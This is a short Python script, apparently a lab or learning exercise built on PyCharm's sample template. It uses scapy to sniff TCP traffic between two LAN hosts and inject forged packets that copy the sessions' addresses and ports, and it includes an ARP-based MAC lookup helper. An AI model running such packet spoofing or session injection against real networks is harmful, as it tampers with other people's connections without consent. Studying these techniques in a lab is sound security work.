# This is a sample Python script.

# Press Shift+F10 to execute it or replace it with your code.
# Press Double Shift to search everywhere for classes, files, tool windows, actions, and settings.

from scapy.all import *
from scapy.layers.inet import ICMP, IP, TCP
from scapy.layers.l2 import ARP, Ether

# Press the green button in the gutter to run the script.
if __name__ == '__main__':

    def spook_pkt(pkt):
        if TCP in pkt:
            if pkt[IP].src == "192.168.1.67" and pkt[IP].dst == "192.168.1.70":
                print(pkt[IP].src)
                print(f"Original Packet..........")
                print(f"Source IP : {pkt[IP].src}")
                print(f"Source port : {pkt[TCP].sport}")
                print(f"Destination IP : {pkt[IP].dst}")
                ip = IP(src=pkt[IP].src, dst=pkt[IP].dst, ihl=pkt[IP].ihl)
                ip.ttl = 99
                # icmp = ICMP(type=0, id=pkt[ICMP].id, seq=pkt[ICMP].seq)
                # print(f"Packet TCP : {pkt[TCP]} {dir(pkt[TCP])}")
                tcp = TCP(dport=pkt[TCP].dport, sport=pkt[TCP].sport, seq=2, ack=pkt[TCP].ack)

                # if pkt.haslayer(Raw):
                    # data = pkt[Raw].load
                    # print("DATA :", data)
                    # tcp.seq = (int(pkt[TCP].seq) + 4)
                newpkt = ip / tcp / b'6\n'

                print("Spoofed packet.......")
                print(f"Src IP : {newpkt[IP].src}")
                print(f"Source port : {newpkt[TCP].sport}")
                print(f"Dst IP : {newpkt[IP].dst}")
                # print(f"New DATA : {newpkt[Raw].load}")
                # print(f"New DATA : {newpkt[Raw].load}")
                # print(f"newpkt : {newpkt[IP].data}")
                print(f"newpkt : {newpkt[Raw]}")

                send(newpkt, verbose=0)
                print()
                time.sleep(3)


    def get_mac(ip):
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = srp(arp_request_broadcast, timeout=5, verbose=False)[0]
        return answered_list[0][1].hwsrc


    # print(get_mac(sys.argv[1]))
    pkg = sniff(filter="tcp and src host 192.168.1.67", prn=spook_pkt)

# See PyCharm help at https://www.jetbrains.com/help/pycharm/
